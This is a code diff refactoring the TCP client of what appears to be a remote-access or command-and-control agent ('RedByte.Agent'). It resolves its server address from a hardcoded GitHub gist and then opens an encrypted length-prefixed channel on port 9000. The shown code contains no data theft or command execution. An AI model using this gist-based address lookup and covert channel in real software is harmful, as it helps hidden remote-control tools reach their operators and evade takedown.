@@ -1,21 +1,26 @@
-using System.Net.Sockets;
+using System.Buffers.Binary;
+using System.IO;
 using System.Net.Http;
+using System.Net.Sockets;
 using NSec.Cryptography;
-
 namespace RedByte.Agent.Network;
 
 public class TcpClientManager
 {
     private static TcpClientManager? _instance;
-    private TcpClient _client;
-    private NetworkStream _stream;
+
+    private TcpClient? _client;
+    private NetworkStream? _stream;
+    private CryptoSession? _crypto;
+
     private const int DefaultPort = 9000;
+    private const int LengthSize = 4;
+    private const int MaxEncryptedBodySize = 2 * 1024 * 1024;
     private const string GitGistURL = "https://gist.githubusercontent.com/galshichrur/1b160c4a5451f18e2fd0e94b844657a5/raw/gistfile1.txt";
 
     public static TcpClientManager GetInstance()
     {
-        if (_instance == null)
-            _instance = new TcpClientManager();
+        _instance ??= new TcpClientManager();
         return _instance;
     }
 
@@ -23,9 +28,14 @@ public class TcpClientManager
     {
         try
         {
+            Disconnect();
+
             _client = new TcpClient();
-            await _client.ConnectAsync(GetServerIp(), DefaultPort);
+            string serverIp = await GetServerIp();
+            await _client.ConnectAsync(serverIp, DefaultPort);
+
             _stream = _client.GetStream();
+            _crypto = new CryptoSession();
 
             await StartSecureSession();
             return true;
@@ -37,67 +47,107 @@ public class TcpClientManager
         }
     }
 
-    public async Task Send(object data)
+    public Task Send(object payload)
     {
-        byte[] payload = Crypto.Encrypt(data);
-        byte[] length = BitConverter.GetBytes(payload.Length);
-
-        await _stream.WriteAsync(length);
-        await _stream.WriteAsync(payload);
+        return SendSecure(payload);
     }
 
     public async Task<T?> Receive<T>()
     {
-        try
-        {
-            byte[] lengthBytes = await ReadExact(4);
-            int length = BitConverter.ToInt32(lengthBytes);
+        return await ReceiveSecure<T>();
+    }
 
-            byte[] payload = await ReadExact(length);
-            return Crypto.Decrypt<T>(payload);
-        }
-        catch
-        {
-            return default;
-        }
+    public void Disconnect()
+    {
+        _crypto?.Clear();
+        _crypto = null;
+
+        _stream?.Close();
+        _stream = null;
+
+        _client?.Close();
+        _client = null;
+    }
+
+    private async Task StartSecureSession()
+    {
+        NetworkStream stream = GetStream();
+        CryptoSession crypto = GetCrypto();
+
+        byte[] clientPublicKey = crypto.CreatePublicKey(out Key privateKey);
+
+        // Handshake, before encryption:
+        // client_public_key(32) -> server
+        // server_public_key(32) -> client
+        await stream.WriteAsync(clientPublicKey, 0, clientPublicKey.Length);
+        byte[] serverPublicKey = await ReadExact(CryptoSession.PublicKeySize);
+
+        crypto.SetSharedKey(privateKey, serverPublicKey);
+    }
+
+    private async Task SendSecure(object payload)
+    {
+        NetworkStream stream = GetStream();
+        CryptoSession crypto = GetCrypto();
+
+        byte[] body = crypto.Encrypt(payload);
+        if (body.Length < CryptoSession.MinEncryptedBodySize || body.Length > MaxEncryptedBodySize)
+            throw new Exception("Invalid encrypted body length.");
+
+        byte[] length = new byte[LengthSize];
+        BinaryPrimitives.WriteUInt32LittleEndian(length, (uint)body.Length);
+
+        await stream.WriteAsync(length, 0, length.Length);
+        await stream.WriteAsync(body, 0, body.Length);
+        await stream.FlushAsync();
+    }
+
+    private async Task<T?> ReceiveSecure<T>()
+    {
+        CryptoSession crypto = GetCrypto();
+
+        byte[] lengthBytes = await ReadExact(LengthSize);
+        uint length = BinaryPrimitives.ReadUInt32LittleEndian(lengthBytes);
+
+        if (length < CryptoSession.MinEncryptedBodySize || length > MaxEncryptedBodySize)
+            throw new Exception($"Invalid encrypted frame length: {length}");
+
+        byte[] body = await ReadExact((int)length);
+        return crypto.Decrypt<T>(body);
     }
 
     private async Task<byte[]> ReadExact(int size)
     {
+        NetworkStream stream = GetStream();
         byte[] buffer = new byte[size];
         int total = 0;
 
         while (total < size)
         {
-            int read = await _stream.ReadAsync(buffer, total, size - total);
-            if (read == 0) throw new Exception();
+            int read = await stream.ReadAsync(buffer, total, size - total);
+            if (read == 0)
+                throw new IOException("Socket closed");
+
             total += read;
         }
 
         return buffer;
     }
 
-    public void Disconnect()
+    private NetworkStream GetStream()
     {
-        Crypto.Clear();
-        _stream?.Close();
-        _client?.Close();
+        return _stream ?? throw new InvalidOperationException("TCP client is not connected.");
     }
 
-    private async Task StartSecureSession()
+    private CryptoSession GetCrypto()
     {
-        byte[] publicKey = Crypto.CreatePublicKey(out Key privateKey);
-
-        // Handshake: public_key(32 bytes)
-        await _stream.WriteAsync(publicKey);
-        byte[] serverPublicKey = await ReadExact(Crypto.PublicKeySize);
-
-        Crypto.SetSharedKey(privateKey, serverPublicKey);
+        return _crypto ?? throw new InvalidOperationException("Secure session was not started.");
     }
 
-    private string GetServerIp()
+    private static async Task<string> GetServerIp()
     {
         using var http = new HttpClient();
-        return http.GetStringAsync(GitGistURL).Result.Trim();
+        string serverIp = await http.GetStringAsync(GitGistURL);
+        return serverIp.Trim();
     }
 }
